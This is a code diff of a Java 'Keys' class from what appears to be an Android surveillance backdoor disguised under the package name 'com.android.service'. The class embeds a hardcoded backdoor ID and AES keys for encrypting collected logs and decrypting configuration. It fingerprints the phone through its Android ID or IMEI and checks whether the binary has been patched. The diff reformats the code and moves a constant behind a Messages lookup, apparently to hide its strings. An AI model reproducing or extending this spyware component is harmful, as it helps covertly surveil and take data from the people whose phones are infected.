@@ -13,6 +13,7 @@ import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 
 import com.android.service.Device;
+import com.android.service.Messages;
 import com.android.service.R;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
@@ -24,7 +25,7 @@ import com.android.service.util.Utils;
  * The Class Keys.
  */
 public class Keys {
-	private static final String TAG = "Keys";
+	private static final String TAG = "Keys"; //$NON-NLS-1$
 	/** The singleton. */
 	private volatile static Keys singleton;
 
@@ -51,27 +52,23 @@ public class Keys {
 
 	protected Keys(boolean fromResources) {
 		if (fromResources) {
-			Resources resources = Status.getAppContext().getResources();
+			final Resources resources = Status.getAppContext().getResources();
 
-			String androidId = Secure.getString(Status.getAppContext()
-					.getContentResolver(), Secure.ANDROID_ID);
+			String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 
-			if ("9774d56d682e549c".equals(androidId)
-					&& !Device.self().isSimulator()) {
+			if (Messages.getString("20.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 				// http://code.google.com/p/android/issues/detail?id=10603
 				// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
-				final TelephonyManager telephonyManager = (TelephonyManager) Status
-						.getAppContext().getSystemService(
-								Context.TELEPHONY_SERVICE);
+				final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+						Context.TELEPHONY_SERVICE);
 
-				String imei = telephonyManager.getDeviceId();
+				final String imei = telephonyManager.getDeviceId();
 				androidId = imei;
 			}
 
 			instanceId = Encryption.SHA1(androidId.getBytes());
 
-			final byte[] resource = Utils.inputStreamToBuffer(
-					resources.openRawResource(R.raw.resources), 0); // resources.bin
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
 			backdoorId = Utils.copy(resource, 0, 14);
 			aesKey = keyFromString(resource, 14, 32);
@@ -79,12 +76,10 @@ public class Keys {
 			challengeKey = keyFromString(resource, 78, 32);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " backdoorId: "
-						+ new String(backdoorId));
-				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey));
-				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey));
-				Check.log(TAG + " challengeKey: "
-						+ Utils.byteArrayToHex(challengeKey));
+				Check.log(TAG + " backdoorId: " + new String(backdoorId)) ;//$NON-NLS-1$
+				Check.log(TAG + " aesKey: " + Utils.byteArrayToHex(aesKey)) ;//$NON-NLS-1$
+				Check.log(TAG + " confKey: " + Utils.byteArrayToHex(confKey)) ;//$NON-NLS-1$
+				Check.log(TAG + " challengeKey: " + Utils.byteArrayToHex(challengeKey)) ;//$NON-NLS-1$
 			}
 
 		}
@@ -99,40 +94,37 @@ public class Keys {
 
 	// 20 bytes that uniquely identifies the device (non-static on purpose)
 	/** The g_ instance id. */
-	private static byte[] instanceId = { 'b', 'g', '5', 'e', 't', 'G', '8',
-			'7', 'q', '2', '0', 'K', 'g', '5', '2', 'W', '5', 'F', 'g', '1' };
+	private static byte[] instanceId = { 'b', 'g', '5', 'e', 't', 'G', '8', '7', 'q', '2', '0', 'K', 'g', '5', '2',
+			'W', '5', 'F', 'g', '1' };
 
 	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
 	/** The Constant g_BackdoorID. */
-	private static byte[] backdoorId = { 'a', 'v', '3', 'p', 'V', 'c', 'k',
-			'1', 'g', 'b', '4', 'e', 'R', '2', 'd', '8', 0 };
+	private static byte[] backdoorId = { 'a', 'v', '3', 'p', 'V', 'c', 'k', '1', 'g', 'b', '4', 'e', 'R', '2', 'd',
+			'8', 0 };
 
 	// AES key used to encrypt logs
 	/** The Constant g_AesKey. */
-	private static byte[] aesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D', 'g',
-			'B', 'q', 'y', 'U', '2', '7', '0', 'F', 'T', 'i', 'd', '3', '7',
-			'1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };
+	private static byte[] aesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D', 'g', 'B', 'q', 'y', 'U', '2', '7', '0', 'F',
+			'T', 'i', 'd', '3', '7', '1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };
 
 	// AES key used to decrypt configuration
 	/** The Constant g_ConfKey. */
-	private static byte[] confKey = { 'A', 'd', 'f', '5', 'V', '5', '7', 'g',
-			'Q', 't', 'y', 'i', '9', '0', 'w', 'U', 'h', 'p', 'b', '8', 'N',
-			'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };
+	private static byte[] confKey = { 'A', 'd', 'f', '5', 'V', '5', '7', 'g', 'Q', 't', 'y', 'i', '9', '0', 'w', 'U',
+			'h', 'p', 'b', '8', 'N', 'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };
 
 	// Challenge key
 	/** The Constant g_Challenge. */
-	private static byte[] challengeKey = { 'f', '7', 'H', 'k', '0', 'f', '5',
-			'u', 's', 'd', '0', '4', 'a', 'p', 'd', 'v', 'q', 'w', '1', '3',
-			'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };
+	private static byte[] challengeKey = { 'f', '7', 'H', 'k', '0', 'f', '5', 'u', 's', 'd', '0', '4', 'a', 'p', 'd',
+			'v', 'q', 'w', '1', '3', 'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };
 
 	/**
-	 * Checks for been binary patched.
+	 * Check. for been binary patched. //$NON-NLS-1$
 	 * 
 	 * @return true, if successful
 	 */
 	public boolean hasBeenBinaryPatched() {
-		return Utils.equals(backdoorId, 0, new byte[] { 'a', 'v', '3', 'p',
-				'V', 'c', 'k', '1', 'g', 'b', '4', 'e' }, 0, 12);
+		return Utils.equals(backdoorId, 0, new byte[] { 'a', 'v', '3', 'p', 'V', 'c', 'k', '1', 'g', 'b', '4', 'e' },
+				0, 12);
 	}
 
 	/**
@@ -190,22 +182,22 @@ public class Keys {
 	}
 
 	private byte[] keyFromString(byte[] resource, int from, int len) {
-		byte[] res = Utils.copy(resource, from, len);
+		final byte[] res = Utils.copy(resource, from, len);
 		return keyFromString(new String(res));
 	}
 
 	private byte[] keyFromString(final String string) {
 		try {
-			int len = 16;
-			byte[] array = new byte[len];
+			final int len = 16;
+			final byte[] array = new byte[len];
 
 			for (int pos = 0; pos < len; pos++) {
-				String repr = string.substring(pos * 2, pos * 2 + 2);
+				final String repr = string.substring(pos * 2, pos * 2 + 2);
 				array[pos] = (byte) Integer.parseInt(repr, 16);
 			}
 
 			return array;
-		} catch (Exception ex) {
+		} catch (final Exception ex) {
 
 			return null;
 		}
